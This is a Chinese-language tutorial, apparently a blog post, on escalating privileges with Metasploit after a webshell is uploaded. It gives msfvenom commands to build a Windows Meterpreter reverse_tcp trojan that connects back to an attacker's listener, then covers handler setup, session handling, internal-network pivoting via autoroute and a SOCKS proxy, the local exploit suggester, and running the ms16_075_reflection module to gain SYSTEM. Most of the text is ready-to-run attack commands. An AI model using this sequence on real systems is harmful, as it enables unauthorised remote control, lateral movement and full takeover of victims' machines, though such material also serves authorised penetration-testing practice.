---
title: 成功上传webshell 后使用MSF提权的一般方法(一)
description: ""
published: 2026-10-10T23:22:45
category: article
tags: []
draft: false
---

# 成功上传webshell 后使用MSF提权的一般方法(一)

## 一、 基础概念

- **MSF（Metasploit Framework）**：模块化渗透测试框架，`msfconsole` 是主要命令行界面。
    
- **Meterpreter**：内存中的原生远控会话，支持系统 API 调用、进程迁移、令牌窃取、端口转发等。
    
- **初始权限**：通过漏洞或木马获得的 Meterpreter 会话，权限通常继承自触发进程的用户（如 `www-data`、`IIS APPPOOL`）。
    
- **提权目标**：从低权限用户提升至 `NT AUTHORITY\SYSTEM`（Windows）或 `root`（Linux）。
    

## 二、 获取初始会话

### 1. 生成木马（msfvenom）

bash

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<监听IP> LPORT=<监听端口> -f exe -o msf.exe

- `LHOST`：攻击机 IP，目标需能访问。
    
- `LPORT`：攻击机监听端口。
    
- 监听器 payload 必须与生成时一致。
    

### 2. 设置监听器

bash

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <攻击机IP>
set LPORT <监听端口>
run

目标运行木马后，MSF 会创建 Meterpreter 会话。

## 三、 会话管理

- `sessions -l`：列出所有会话。
    
- `sessions -i <ID>`：进入指定会话。
    
- `background` 或 `Ctrl+Z`：将会话挂起到后台，返回 MSF 主控制台。
    
- `sessions -u <ID>`：将普通 shell 升级为 Meterpreter 会话。
    

## 四、 后渗透信息收集

进入 Meterpreter 后：

- `getuid`：查看当前用户。
    
- `sysinfo`：查看系统信息。
    
- `ipconfig`：查看网络配置。
    
- `run autoroute -s <内网网段>/24`：添加路由，将目标作为跳板。
    
- `use auxiliary/server/socks_proxy`：开启 SOCKS 代理，配合 `proxychains` 扫描内网。
    

## 五、 自动寻找提权漏洞

1. 挂起当前会话：`background`。
    
2. 使用探测器：
    
    bash
    
    use post/multi/recon/local_exploit_suggester
    set showdescription true
    show options
    set SESSION <ID>
    run
    
3. 扫描完成后，会列出可能的本地提权模块。
    

## 六、 执行提权攻击

假设扫描建议模块为 `exploit/windows/local/ms16_075_reflection`：

1. 选择模块：
    
    bash
    
    use exploit/windows/local/ms16_075_reflection
    
2. 查看参数：
    
    bash
    
    show options
    
3. 配置参数：
    
    bash
    
    set SESSION <ID>
    set payload windows/meterpreter/reverse_tcp
    set LHOST <攻击机IP>
    set LPORT <新端口>
    
    - `LPORT` 需使用新端口，避免冲突。
        
4. 发起攻击：
    
    bash
    
    run
    
5. 验证结果：
    
    - 看到 `Meterpreter session <新ID> opened`。
        
    - `sessions -l` 确认新会话。
        
    - `sessions -i <新ID>` 进入。
        
    - `getuid` 检查是否提权成功




